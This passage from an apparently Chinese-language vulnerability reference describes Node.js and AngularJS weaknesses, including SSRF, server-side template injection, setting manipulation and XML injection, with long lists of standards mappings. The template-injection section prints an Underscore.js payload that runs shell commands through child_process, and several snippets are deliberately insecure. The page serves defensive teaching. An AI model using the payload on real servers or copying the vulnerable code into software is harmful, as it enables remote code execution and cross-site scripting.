<p>但在某些情况下，这种方法并不可行，因为这样一份合法资源名的列表过于庞大，维护难度过大。因此，在这种情况下，程序员通常会采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。</p>
<p>此外，如果需要，还要确保用户输入仅用于在目标系统上指定资源，但 URI 方案、主机和端口由应用程序控制。这样就可以大大减小攻击者能够造成的损害。</p>
<h5 id="REFERENCES-42"><a href="#REFERENCES-42" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Alexander Polyakov SSRF vs. Business critical applications BlackHat 2012</p>
<p>[2] SSRF bible. Cheatsheet ONSec Labs</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 918 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.2.6 Sanitization and Sandboxing Requirements, 12.6.1 SSRF Protection Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A5 Broken Access Control </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Abuse of Functionality (WASC-42) </p>
<h4 id="Server-Side-Template-Injection"><a href="#Server-Side-Template-Injection" class="headerlink" title="Server-Side Template Injection"></a>Server-Side Template Injection</h4><h5 id="ABSTRACT-43"><a href="#ABSTRACT-43" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>用户控制的数据用作模板引擎的模板，使得攻击者能够访问模板上下文，并在某些情况下在应用程序服务器中注入和运行任意代码。</p>
<h5 id="EXPLANATION-43"><a href="#EXPLANATION-43" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并通过模板设置格式，以生成 Web 页面、电子邮件等。模板引擎可通过条件、循环等代码构造处理上下文数据，从而允许在模板中使用功能强大的语言表达式来呈现动态内容。如果攻击者能够控制要呈现的模板，他们将能够通过注入表达式来公开上下文数据，甚至在服务器上运行任意命令。</p>
<p>示例 1：下面的示例显示了如何通过 HTTP 请求检索模板并呈现该模板。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.get(&apos;/&apos;, function(req, res)&#123;</span><br><span class="line"></span><br><span class="line">    var template = _.template(req.params[&apos;template&apos;]);</span><br><span class="line"></span><br><span class="line">    res.write(&quot;&lt;html&gt;&lt;body&gt;&lt;h2&gt;Hello World!&lt;/h2&gt;&quot; + template() + &quot;&lt;/body&gt;&lt;/html&gt;&quot;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>Example 1会使用Underscore.js作为Node.js应用程序中的模板引擎。对于该引擎，攻击者可以提交以下模板以在服务器上运行任意命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% cp = process.mainModule.require(&apos;child_process&apos;);cp.exec(&lt;COMMAND&gt;); %&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-43"><a href="#RECOMMENDATIONS-43" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>尽可能不要让用户提供模板。如果需要由用户提供模板，请谨慎执行输入验证，以防止在模板中注入恶意代码。</p>
<h5 id="REFERENCES-43"><a href="#REFERENCES-43" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Server-Side Template Injection: RCE for the modern webapp </p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 95 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [18] CWE ID 094 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.2.4 Sanitization and Sandboxing Requirements, 5.2.5 Sanitization and Sandboxing Requirements, 5.2.8 Sanitization and Sandboxing Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[23] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116 </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Setting-Manipulation"><a href="#Setting-Manipulation" class="headerlink" title="Setting Manipulation"></a>Setting Manipulation</h4><h5 id="ABSTRACT-44"><a href="#ABSTRACT-44" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>允许对系统设置进行外部控制可以导致服务中断或意外的应用程序行为。</p>
<h5 id="EXPLANATION-44"><a href="#EXPLANATION-44" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者能够通过控制某些值来监控系统的行为、管理特定的资源、或在某个方面影响应用程序的功能时，即表示发生了 Setting Manipulation 漏洞。</p>
<p>由于 Setting Manipulation 漏洞影响到许多功能，因此，对它的任何说明都必然是不完整的。与其在 Setting Manipulation 这一类中寻找各个功能之间的紧密关系，不如往后退一步，考虑有哪些系统数值类型不能由攻击者来控制。</p>
<p>示例 1：下面的 Node.js 代码片段会在 http.IncomingMessage 请求变量中读取字符串，并使用该字符串设置其他 V8 命令行标记。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var v8 = require(&apos;v8&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">var flags = url.parse(request.url, true)[&apos;query&apos;][&apos;flags&apos;];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">v8.setFlagsFromString(flags);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在此示例中，攻击者可以导致在 VM 上设置各种不同的标记，这可能会导致不可预知的行为，包括程序崩溃或潜在的数据丢失。</p>
<p>总之，应禁止使用用户提供的数据或通过其他途径获取不可信任的数据，以防止攻击者控制某些敏感的数值。虽然攻击者控制这些数值的影响不会总能立刻显现，但是不要低估了攻击者的攻击力。</p>
<h5 id="RECOMMENDATIONS-44"><a href="#RECOMMENDATIONS-44" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>禁止由不可信赖的数据来控制敏感数值。在发生此种错误的诸多情况中，应用程序预期通过某种特定的输入，仅得到某一区间内的数值。如果可能的话，应用程序应仅通过输入从预定的安全数值集合中选择数据，而不是依靠输入得到期望的数值，从而确保应用程序行为得当。针对恶意输入，传递给敏感函数的数值应当是该集合中的某些安全选项的默认设置。即使无法事先了解安全数值集合，通常也可以检验输入是否在某个安全的数值区间内。若上述两种验证机制均不可行，则必须重新设计应用程序，以避免应用程序接受由用户提供的潜在危险数值。</p>
<p>REFERENCES</p>
<p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 15 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[3] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[4] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[5] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.5.4 Input and Output Architectural Requirements, 5.2.1 Sanitization and Sandboxing Requirements, 5.3.1 Output Encoding and Injection Prevention Requirements, 13.1.1 Generic Web Service Security Verification Requirements, 14.4.2 HTTP Security Headers Requirements, 14.4.4 HTTP Security Headers Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Setting-Manipulation-User-Controlled-Expression-Delimiters"><a href="#Setting-Manipulation-User-Controlled-Expression-Delimiters" class="headerlink" title="Setting Manipulation: User-Controlled Expression Delimiters"></a>Setting Manipulation: User-Controlled Expression Delimiters</h4><h5 id="ABSTRACT-45"><a href="#ABSTRACT-45" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序允许用户定义表达式分隔符，使用户能够规避 cross-site scripting 保护。</p>
<h5 id="EXPLANATION-45"><a href="#EXPLANATION-45" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果允许用户定义模板引擎使用的分隔符，则意味着之前实施的保护可能不再起作用，或者可能无效。在危害最轻的情况下，这可能会导致功能无法按预期运行，或者导致信息泄露，但还可能会让恶意用户能够规避引擎保护，从而引发 cross-site scripting 漏洞。 </p>
<p>示例 1：在以下代码中，AngularJS 模块配置为在 URL 中使用从散列定义的开始符号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var hash = window.location.hash;</span><br><span class="line"></span><br><span class="line">var myStartSymbol = decodeURIComponent(hash.substring(1, hash.length));</span><br><span class="line"></span><br><span class="line">myModule.config(function($interpolateProvider)&#123;</span><br><span class="line"></span><br><span class="line">    $interpolateProvider.startSymbol(myStartSymbol);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这样做通常是为了能够同时使用多个模板引擎，这实际上极为危险 [1]，可能会导致正在运行的引擎与 AngularJS 表达式不兼容，从而可能导致用户能够绕过常规验证，在浏览器中运行他们自己的代码。</p>
<h5 id="RECOMMENDATIONS-45"><a href="#RECOMMENDATIONS-45" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>一般而言，最好完全不要混合模板引擎，尤其重要的是，不要允许用户在运行时对此进行定义。从开发人员的角度而言，这样做实际上对两种模板引擎都无法提供保护，而且强制执行这些验证的模板引擎未考虑一种情况，即您可能会将它们的模板引擎与其他模板引擎同时运行。</p>
<h5 id="REFERENCES-44"><a href="#REFERENCES-44" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] AngularJS $interpolateProvider documentation Google</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 15 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[14] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Setting-Manipulation-User-Controlled-Whitelist"><a href="#Setting-Manipulation-User-Controlled-Whitelist" class="headerlink" title="Setting Manipulation: User-Controlled Whitelist"></a>Setting Manipulation: User-Controlled Whitelist</h4><h5 id="ABSTRACT-46"><a href="#ABSTRACT-46" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序允许用户定义白名单，使用户可以将恶意输入标记为安全。</p>
<h5 id="EXPLANATION-46"><a href="#EXPLANATION-46" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>框架通常会定义验证白名单，以免受漏洞攻击。</p>
<p>示例 1：以下代码允许恶意用户设置白名单，AngularJS 使用此白名单确定可以检索哪些类型的链接图像。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">myModule.config(function($compileProvider)&#123;</span><br><span class="line"></span><br><span class="line">    $compileProvider.imgSrcSanitizationWhitelist(userInput);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这样看似正常，但如果用户将正则表达式设置为 /^(http(s)?|javascript):.*/，应用程序可能会允许在图像源 URL 中使用内联 JavaScript，这可能会引发 cross-site scripting 攻击。</p>
<p>对白名单的其他使用可能会阻止所有不同类型的攻击，尤其是 cross-site scripting、command injection、SQL injection 等注入攻击以及业务逻辑缺陷。</p>
<h5 id="RECOMMENDATIONS-46"><a href="#RECOMMENDATIONS-46" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>总之，不应允许用户设置供框架内部用于进行安全或业务逻辑验证的白名单。除非符合以下条件：对白名单的配置更严格、仅允许管理员设置白名单且通常在配置文件中进行设置。</p>
<h5 id="REFERENCES-45"><a href="#REFERENCES-45" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 15 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[3] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[13] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="XML-Injection"><a href="#XML-Injection" class="headerlink" title="XML Injection"></a>XML Injection</h4><h5 id="ABSTRACT-47"><a href="#ABSTRACT-47" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果在 XML 文档中写入未验证的数据，可能会使攻击者修改 XML 的结构和内容。</p>
<h5 id="EXPLANATION-47"><a href="#EXPLANATION-47" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>XML injection 会在以下情况中出现：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据写入到 XML 文档中。</p>
</li>
</ol>
<p>应用程序通常使用 XML 来存储数据或发送消息。当 XML 用于存储数据时，XML 文档通常会像数据库一样进行处理，而且可能会包含敏感信息。XML 消息通常在 web 服务中使用，也可用于传输敏感信息。XML 消息甚至还可用于发送身份验证凭据。</p>
<p>如果攻击者能够写入原始 XML，则可以更改 XML 文档和消息的语义。危害最轻的情况下，攻击者可能会插入无关的标签，导致 XML 解析器抛出异常。XML injection 更为严重的情况下，攻击者可以添加 XML 元素，更改身份验证凭据或修改 XML 电子商务数据库中的价格。还有一些情况，XML injection 可以导致 cross-site scripting 或 dynamic code evaluation。</p>
<p>例 1：</p>
<p>假设攻击者能够控制下列 XML 中的 shoes。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;order&gt;</span><br><span class="line"></span><br><span class="line">   &lt;price&gt;100.00&lt;/price&gt;</span><br><span class="line"></span><br><span class="line">   &lt;item&gt;shoes&lt;/item&gt;</span><br><span class="line"></span><br><span class="line">&lt;/order&gt;</span><br></pre></td></tr></table></figure>
